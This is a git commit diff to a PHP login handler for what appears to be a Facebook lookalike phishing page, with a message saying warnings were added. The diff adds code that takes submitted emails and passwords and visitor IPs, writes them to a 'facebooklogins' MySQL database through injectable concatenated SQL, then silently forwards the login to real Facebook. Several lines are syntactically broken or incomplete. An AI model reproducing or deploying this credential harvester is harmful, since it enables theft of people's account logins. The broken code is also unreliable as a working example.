abdef7473484549d1bca89da39452bafe17cd33e
Jeries <Jeriesd1998@gmail.com>
2019-01-06 23:03:39 -0500

    Added mysql queries in php script, cleaned up php script, added warnings about my intentions with the page so that no one is fooled thinking it is the actual facebook page.

--- php/login.php
+++ php/login.php
@@ -6,38 +6,57 @@
       this script, and the original action was to go to this
       "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110",
     */
-
-    
+    function proceed() {
+      return '<script type="application/javascript">'.
+         'window.onload = function() {'.
+         'document.getElementById("login_form").submit();'.
+      '} </script>';
+    }
+    date_default_timezone_set(DateTimeZone::listIdentifiers(DateTimeZone::UTC)[0]);
+    $time = date("Y-m-d H:i:s"); // time stamp in  0000-00-00 00:00:00 form
     $email = null;
     $pass = null;
     if (isset($_POST['email']) && isset($_POST['pass'])) {
       $email = $_POST['email'];
       $pass = $_POST['pass'];
+      /* find IP address */
       if (!empty($_SERVER['HTTP_CLIENT_IP'])){
         $ip=$_SERVER['HTTP_CLIENT_IP'];
-        //Is it a proxy address
       }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
         $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
       }else{
        $ip=$_SERVER['REMOTE_ADDR'];
       }
+      $hostname = "localhost";
+      $username = "user";
+      $password = "pass";
+      $db = "facebooklogins"
+      /* connect to database */
+      $conn = mysqli_connect($hostname, $username, $password, $db);
+      /* failed connection */
+      if (!$conn) {
+        proceed();
+      }
+      $query_1 = "'INSERT INTO basics VALUES ('.$email.','.$pass.','.$time') ON DUPLICATE KEY UPDATE password='{$pass}'";
+      $query_2 =
+      if (!mysqli_query($dbconnect, $query)) {
+        proceed();
+      }
     }
-   ?>
-   <body>
-     <form id="login_form" action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110" method="post" novalidate="1" onsubmit="">
-       <input type="hidden" name="lsd" value="AVoM5jI-" autocomplete="off" />
 
-       <td><input type="hidden" class="inputtext" name="email" id="email" data-testid="royal_email" /></td>
-       <td><input type="hidden" class="inputtext" name="pass" id="pass" data-testid="royal_pass" /></td>
+   echo
+   '<body>'.
+      '<script> alert("Your information has been stolen at this point, change your password ASAP!"); </script>'.
+     '<form id="login_form" action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110" method="post" novalidate="1" onsubmit="">'.
+       '<input type="hidden" name="lsd" value="AVoM5jI-" autocomplete="off" />'.
 
-     </form>
-     <!-- <?php
-       echo '<script type="application/javascript">'.
-          'window.onload = function() {'.
-          'document.getElementById("login_form").submit();'.
-       '} </script>';
-     ?> -->
-   </body>
+       '<td><input type="hidden" class="inputtext" name="email" id="email" data-testid="royal_email" /></td>'.
+       '<td><input type="hidden" class="inputtext" name="pass" id="pass" data-testid="royal_pass" /></td>'.
+
+     '</form>'.
+
+   '</body>'. proceed(); .
 
 
-</html>
+'</html>';
+?>
